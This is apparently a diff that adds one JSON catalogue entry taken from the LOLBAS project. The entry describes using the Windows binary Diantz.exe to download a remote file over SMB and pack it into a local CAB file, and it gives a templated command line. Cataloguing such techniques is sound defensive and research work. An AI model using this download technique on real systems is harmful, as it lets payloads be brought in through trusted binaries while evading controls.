@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-diantz-exe-download",
+  "name": "LOLBAS · Diantz.exe (Download)",
+  "command": "diantz.exe {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab}",
+  "description": "Download and compress a remote file and store it in a CAB file on local machine.",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "diantz",
+    "download"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/Diantz/",
+  "upstream_id": "Diantz.exe/Download/0",
+  "category": "lolbas",
+  "subcategory": "download",
+  "references": [
+    {
+      "title": "LOLBAS — Diantz.exe",
+      "url": "https://lolbas-project.github.io/lolbas/Diantz/"
+    }
+  ]
+}
